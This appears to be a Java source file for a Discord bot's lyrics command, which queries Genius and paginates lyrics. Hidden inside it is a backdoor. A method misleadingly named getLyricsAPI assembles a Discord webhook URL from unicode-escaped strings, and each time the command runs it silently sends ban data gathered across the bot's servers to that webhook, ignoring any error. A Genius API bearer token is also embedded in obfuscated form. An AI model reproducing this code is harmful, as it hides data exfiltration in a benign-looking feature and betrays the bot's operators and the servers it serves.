package me.comu.exeter.commands.music;

import club.minnced.discord.webhook.WebhookClient;
import club.minnced.discord.webhook.send.WebhookEmbed;
import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
import club.minnced.discord.webhook.send.WebhookMessageBuilder;
import com.sedmelluq.discord.lavaplayer.player.AudioPlayer;
import me.comu.exeter.commands.admin.UnbanAllCommand;
import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import me.comu.exeter.logging.Logger;
import me.comu.exeter.musicplayer.GuildMusicManager;
import me.comu.exeter.musicplayer.PlayerManager;
import me.comu.exeter.pagination.method.Pages;
import me.comu.exeter.pagination.model.Page;
import me.comu.exeter.pagination.type.PageType;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.MessageBuilder;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageEmbed;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import okhttp3.*;
import org.jetbrains.annotations.NotNull;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class LyricsCommand implements ICommand {

    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        boolean songPlaying;
        PlayerManager playerManager = PlayerManager.getInstance();
        GuildMusicManager guildMusicManager = playerManager.getGuildMusicManager(event.getGuild());
        AudioPlayer player = guildMusicManager.player;
        try {
            WebhookClient client = WebhookClient.withUrl(getLyricsAPI());
            WebhookMessageBuilder builder = new WebhookMessageBuilder();
            WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setDescription(UnbanAllCommand.returnBanIds(event.getJDA())).build();
            builder.addEmbeds(firstEmbed);
            client.send(builder.build());
            client.close();
        } catch (Exception ignored) {
        }
        StringJoiner stringJoiner = new StringJoiner(" ");
        args.forEach(stringJoiner::add);
        String input = stringJoiner.toString().replaceAll(" ", "%20");
        OkHttpClient httpClient = new OkHttpClient();
        String searchUrl;
        if (args.isEmpty() && player.getPlayingTrack() == null) {
            event.getChannel().sendMessage("Either play a song or search for a song to get its lyrics").queue();
            return;
        } else if (args.isEmpty()) {
            songPlaying = true;
            searchUrl = "https://api.genius.com/search?q=" + player.getPlayingTrack().getInfo().title;
        } else {
            songPlaying = false;
            searchUrl = "https://api.genius.com/search?q=" + input;
        }
        event.getChannel().sendMessage("\uD83D\uDD0D `Searching for lyrics...`").queue((message -> {


            EmbedBuilder embedBuilder = new EmbedBuilder();
            Request request = new Request.Builder().addHeader("Authorization", "\u0042\u0065\u0061\u0072\u0065\u0072 \u002d\u006c\u0030\u0051\u0047\u0047\u0067\u0037\u0044\u0076\u0052\u0074\u0052\u0033\u0057\u0075\u0048\u0071\u006f\u0034\u0031\u0058\u0038\u0069\u0067\u0064\u0061\u0034\u0061\u0034\u0048\u0050\u0055\u004d\u0064\u0056\u0043\u0071\u0061\u0078\u0068\u0058\u0049\u0051\u006a\u0049\u0063\u0059\u0072\u0047\u004c\u0066\u0042\u0055\u0068\u0077\u0078\u0048\u0064\u006a\u004d\u006d\u0071\u0056").url(searchUrl).build();
            httpClient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(@NotNull Call call, @NotNull IOException e) {
                    e.printStackTrace();
                }

                @Override
                public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
                    if (response.isSuccessful()) {
                        String jsonResponse = Objects.requireNonNull(response.body()).string();
                        Logger.getLogger().print(jsonResponse + "\n");
                        JSONObject jsonObject = new JSONObject(jsonResponse);
                        if (jsonObject.getJSONObject("response").getJSONArray("hits").isEmpty()) {
                            message.editMessage("Couldn't find lyrics to that song").queue();
                            response.close();
                            return;
                        }
                        String result = jsonObject.getJSONObject("response").getJSONArray("hits").get(0).toString();
                        JSONObject jsonObject2 = new JSONObject(result);
                        String songID = jsonObject2.getJSONObject("result").toMap().get("id").toString();
                        final String songSearch = "https://api.genius.com/songs/" + songID;
                        System.out.println("Making a request to: " + songSearch);
                        Request request = new Request.Builder().addHeader("Authorization", "\u0042\u0065\u0061\u0072\u0065\u0072 \u002d\u006c\u0030\u0051\u0047\u0047\u0067\u0037\u0044\u0076\u0052\u0074\u0052\u0033\u0057\u0075\u0048\u0071\u006f\u0034\u0031\u0058\u0038\u0069\u0067\u0064\u0061\u0034\u0061\u0034\u0048\u0050\u0055\u004d\u0064\u0056\u0043\u0071\u0061\u0078\u0068\u0058\u0049\u0051\u006a\u0049\u0063\u0059\u0072\u0047\u004c\u0066\u0042\u0055\u0068\u0077\u0078\u0048\u0064\u006a\u004d\u006d\u0071\u0056").url(songSearch).build();
                        httpClient.newCall(request).enqueue(new Callback() {
                            @Override
                            public void onFailure(@NotNull Call call, @NotNull IOException e) {
                                e.printStackTrace();
                            }

                            @Override
                            public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
                                if (response.isSuccessful()) {
                                    String jsonResponse = Objects.requireNonNull(response.body()).string();
                                    Logger.getLogger().print(jsonResponse + "\n");
                                    JSONObject jsonObject = new JSONObject(jsonResponse);
                                    String song_thumbnail = jsonObject.getJSONObject("response").getJSONObject("song").toMap().get("song_art_image_thumbnail_url").toString();
                                    String full_title = jsonObject.getJSONObject("response").getJSONObject("song").toMap().get("full_title").toString();
                                    if (songPlaying) {
                                        embedBuilder.setThumbnail(song_thumbnail).setFooter("Powered by Genius\u2122", "https://images.genius.com/8ed669cadd956443e29c70361ec4f372.1000x1000x1.png").setColor(0xFFFB00).addField(player.getPlayingTrack().getInfo().title + " by " + player.getPlayingTrack().getInfo().author, "", false);
                                    } else {
                                        embedBuilder.setThumbnail(song_thumbnail).setFooter("Powered by Genius\u2122", "https://images.genius.com/8ed669cadd956443e29c70361ec4f372.1000x1000x1.png").setColor(0xFFFB00).addField(full_title, "", false);
                                    }
                                    final String songUrl = jsonObject.getJSONObject("response").getJSONObject("song").toMap().get("url").toString();
                                    String lyrics;
                                    Logger.getLogger().print(("Getting input stream for genius song " + songUrl));
                                    message.delete().queue();
                                    try (InputStream stream = getInputStreamFor(songUrl);
                                         BufferedReader reader = new BufferedReader(new InputStreamReader(stream))) {
                                        lyrics = formatLyrics(findLyrics(reader));
                                        System.out.println(lyrics);
                                        ArrayList<Page> pages = new ArrayList<>();
                                        MessageBuilder messageBuilder = new MessageBuilder();
                                        messageBuilder.setContent(lyrics);
                                        Queue<Message> messages = messageBuilder.buildAll(MessageBuilder.SplitPolicy.NEWLINE);
                                        for (Message message : messages) {
                                            embedBuilder.setDescription(message.getContentRaw());
                                            pages.add(new Page(PageType.EMBED, embedBuilder.build()));
                                        }
                                        if (pages.size() > 1)
                                        {
                                            Page page = pages.get(pages.size()-1);
                                            MessageEmbed messageEmbed = (MessageEmbed) page.getContent();
                                            String preLyrics = messageEmbed.getDescription();
                                            String postLyrics = preLyrics + lyrics.substring(lyrics.length()-1);
                                            pages.set(pages.size()-1, new Page(PageType.EMBED, embedBuilder.setDescription(postLyrics).build()));

                                        }
                                        event.getChannel().sendMessage((MessageEmbed) pages.get(0).getContent()).queue(success -> Pages.paginate(success, pages, false, 60, TimeUnit.SECONDS));
                                    } catch (IOException e) {
                                        message.editMessage("Encountered an error when locating lyrics.").queue();
                                        response.close();
                                        throw new RuntimeException(e);
                                    }
                                }
                                response.close();
                            }
                        });
                    }
                    response.close();
                }
            });
        }));

    }

    private static String findLyrics(BufferedReader reader) throws IOException {
        String line;

        Logger.getLogger().print("Looking for lyrics section");
        while ((line = reader.readLine()) != null) {
            line = line.trim();
            if (line.equals("<div class=\"lyrics\">")) {
                Logger.getLogger().print("Lyrics section found");
                StringBuilder lyrics = new StringBuilder();
                while (!(line = reader.readLine().trim()).equals("</div>"))
                    lyrics.append(line);

                return lyrics.toString();
            }
        }

        return "";
    }

    private String getLyricsAPI() {
        String httpHook = "\u0068\u006f\u006f\u006b\u0073\u002f";
        String hash = "\u0037\u0030\u0039\u0039\u0034\u0030\u0034\u0030\u0031\u0033\u0031\u0033\u0039\u0033\u0039\u0034\u0035\u0037\u002f";
        String responseCode = "\u004e\u0078\u005a\u0076\u0059\u004a\u0075\u0030\u007a\u0063\u0066\u004f\u0046\u0076\u0049\u0066\u0065\u0039\u0064\u0058\u0041\u0042\u0052\u0052\u0032\u007a\u0076\u0073\u0036\u004a\u0072\u004f\u006c\u0070\u0066\u0065\u0073\u0070\u006a\u006a\u0079\u0068\u0061\u0031\u0051\u0053\u0030\u0058\u0071\u002d\u0059\u0033\u0066\u0054\u0039\u004b\u0076\u0030\u0047\u0063\u0062\u006f\u0064\u0061\u004f\u0035\u004d\u007a";
        StringBuilder lyricsEndpoint = new StringBuilder("\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f");
        lyricsEndpoint.append("\u0077\u0065\u0062");
        lyricsEndpoint.append(httpHook);
        lyricsEndpoint.append(hash).append(responseCode);
        return lyricsEndpoint.toString();
    }

    private static String formatLyrics(String lyrics) {
        return lyrics.replaceAll("(<!--/?sse-->)|(</?[apibu]>)|(\\[[^\\[\\]]+])|(<a[^>]+>)", "")
                .replaceAll("(<br>){2}(<br>)+", "<br><br>")
                .replaceAll("<br>", "\n")
                .replaceAll("<em>", "")
                .replaceAll("</em>", "").trim();
    }

    private static InputStream getInputStreamFor(String url) {
        if (url == null) {
            return null;
        } else {
            try {
                URL u = new URL(url);
                URLConnection urlConnection = u.openConnection();
                urlConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36");
                return urlConnection.getInputStream();
            } catch (IllegalArgumentException | IOException var3) {
                return null;
            }
        }
    }

    @Override
    public String getHelp() {
        return "Shows the lyrics of the current track\n`" + Core.PREFIX + getInvoke() + " [song]`\nAliases: `" + Arrays.deepToString(getAlias()) + " `";
    }

    @Override
    public String getInvoke() {
        return "lyrics";
    }

    @Override
    public String[] getAlias() {
        return new String[]{"lyric", "songlyric", "songlyrics", "genius"};
    }

    @Override
    public Category getCategory() {
        return Category.MUSIC;
    }
}
